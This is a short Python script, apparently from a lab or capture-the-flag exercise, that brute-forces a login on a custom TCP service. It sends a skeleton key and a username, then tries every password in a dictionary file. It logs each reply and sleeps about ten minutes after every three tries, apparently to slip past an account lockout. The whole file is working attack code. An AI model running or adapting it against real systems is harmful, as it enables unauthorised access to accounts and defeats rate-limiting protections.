import socket
import time 
import sys 


#Usage: python3 ports.py [ip adress] [port(as a file)] [skeleton key] [user] [dictionary(as a file)]

#HOST = '192.168.1.10'
#PORT = 10589

def main():
   counter = 1
   
   ip = sys.argv[1]
   port = sys.argv[2]
   
   findport = open(port,"r")
   for line in findport:
      PORT = line 
      PORT = int(PORT)
   skel = sys.argv[3]
   user = sys.argv[4]
   dict = sys.argv[5]
   dictionary = open(dict,"r")
   for line in dictionary:
      outputfile = open("dictresults","a")
      current = str(counter) + " " + line 
      outputfile.write(current)
      print(current)
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.connect((ip, PORT))
          #skeleton = 'Passepartout'.encode()
          skeleton = skel.encode()
          s.sendall(skeleton)
          
          username = user.encode() 
          #username = 'midquan'.encode() 
          data = s.recv(2048)
          s.sendall(username)
          data2 = s.recv(2048)
          password = line.encode()
          s.sendall(password)
          data3 = s.recv(2048)
      #print('Received', repr(data))
      print(repr(data2))
      print(repr(data3))
      outputfile.write(repr(data2))
      outputfile.write("\n")
      outputfile.write(repr(data3))
      outputfile.write("\n")
      counter += 1
      if (counter - 1) % 3 == 0: 
         time.sleep(610)
      outputfile.close()
   
if __name__ == '__main__':
    main()
